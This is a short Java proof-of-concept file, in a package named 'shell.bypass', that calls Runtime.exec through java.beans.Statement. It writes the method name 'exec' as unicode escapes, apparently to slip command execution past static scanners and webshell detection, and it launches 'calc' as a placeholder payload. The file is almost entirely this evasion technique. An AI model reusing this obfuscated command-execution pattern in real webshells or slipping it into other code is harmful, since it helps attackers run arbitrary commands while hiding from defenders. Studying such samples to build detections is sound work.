package shell.bypass;

import java.beans.Statement;

public class test2 {
    public static void main(String[] args) {
        String payload ="calc";
        Statement statement = new Statement(Runtime.getRuntime(), "\u0065" + "\u0078" + "\u0065" + "\u0063", new Object[]{payload});
        try {
            statement.execute();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}

